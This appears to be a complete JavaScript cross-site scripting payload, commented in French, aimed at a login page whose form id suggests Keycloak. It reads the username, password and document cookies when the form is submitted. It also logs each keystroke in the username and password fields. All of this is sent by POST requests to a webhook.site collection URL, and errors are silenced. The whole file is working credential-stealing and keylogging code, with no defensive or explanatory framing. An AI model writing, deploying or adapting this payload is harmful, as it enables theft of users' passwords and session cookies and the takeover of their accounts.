(function() {
  // Sécurité : éviter double exécution
  if (window.__xss_ran__) return;
  window.__xss_ran__ = true;

  // Fonction pour envoyer les creds + cookies
  function sendCreds() {
    try {
      const username = document.getElementById('username')?.value || '';
      const password = document.getElementById('password')?.value || '';
      const cookies = document.cookie;

      const data = {
        username: username,
        password: password,
        cookies: cookies,
        userAgent: navigator.userAgent,
        location: window.location.href
      };

      fetch('https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });
    } catch (err) {
      // Silencer les erreurs
    }
  }

  // Hook sur le submit du formulaire
  const form = document.getElementById('kc-form-login');
  if (form) {
    form.addEventListener('submit', sendCreds);
  }

  // Keylogger minimal
  const usernameInput = document.getElementById('username');
  const passwordInput = document.getElementById('password');

  if (usernameInput) {
    usernameInput.addEventListener('input', () => {
      fetch('https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          type: 'keylog',
          field: 'username',
          value: usernameInput.value
        })
      });
    });
  }

  if (passwordInput) {
    passwordInput.addEventListener('input', () => {
      fetch('https://webhook.site/8da442bc-35ab-4621-b309-0af722556df8', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          type: 'keylog',
          field: 'password',
          value: passwordInput.value
        })
      });
    });
  }
})();
